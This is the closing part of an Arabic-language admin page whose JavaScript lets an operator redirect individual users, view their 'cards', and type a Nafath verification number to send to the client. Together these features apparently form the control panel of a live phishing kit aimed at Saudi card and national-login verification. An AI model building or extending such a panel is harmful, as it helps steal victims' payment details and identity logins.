                    showToast('نجح التوجيه', 'تم توجيه المستخدم بنجاح', 'success');
                    bootstrap.Modal.getInstance(document.getElementById('userInfoModal')).hide();
                },
                error: function() {
                    showToast('خطأ', 'حدث خطأ في التوجيه', 'error');
                }
            });
        }

        function redirectUserFromCard() {
            const page = document.getElementById('redirectPageCard').value;
            
            if (!currentUserId) {
                showToast('خطأ', 'لم يتم تحديد المستخدم', 'error');
                return;
            }
            
            $.ajax({
                url: 'redirect-user.php',
                method: 'POST',
                data: {
                    user_id: currentUserId,
                    page: page
                },
                success: function(response) {
                    let data = null;
                    try { data = JSON.parse(response); } catch (e) {}
                    if (!data || data.success !== true) {
                        showToast('خطأ', (data && data.error) ? data.error : 'فشل التوجيه', 'error');
                        return;
                    }
                    showToast('نجح التوجيه', 'تم توجيه المستخدم بنجاح', 'success');
                    bootstrap.Modal.getInstance(document.getElementById('userCardsModal')).hide();
                },
                error: function() {
                    showToast('خطأ', 'حدث خطأ في التوجيه', 'error');
                }
            });
        }

        function redirectUserFromNafad() {
            const page = document.getElementById('redirectPageNafad').value;

            if (!currentUserId) {
                showToast('خطأ', 'لم يتم تحديد المستخدم', 'error');
                return;
            }

            $.ajax({
                url: 'redirect-user.php',
                method: 'POST',
                data: {
                    user_id: currentUserId,
                    page: page
                },
                success: function (response) {
                    let data = null;
                    try { data = JSON.parse(response); } catch (e) {}
                    if (!data || data.success !== true) {
                        showToast('خطأ', (data && data.error) ? data.error : 'فشل التوجيه', 'error');
                        return;
                    }
                    showToast('نجح التوجيه', 'تم توجيه المستخدم بنجاح', 'success');
                    refreshNafadModal(currentUserId);
                },
                error: function () {
                    showToast('خطأ', 'حدث خطأ في التوجيه', 'error');
                }
            });
        }

        // Select All Checkbox
        document.getElementById('selectAll')?.addEventListener('change', function() {
            const checkboxes = document.querySelectorAll('.user-checkbox');
            checkboxes.forEach(cb => cb.checked = this.checked);
            updateBulkActions();
        });

        // السماح بإدخال أرقام فقط
        document.getElementById('nafathNumberInput')?.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        // إرسال عند الضغط على Enter
        document.getElementById('nafathNumberInput')?.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendNafathNumberToClient();
            }
        });
    </script>
</body>
</html>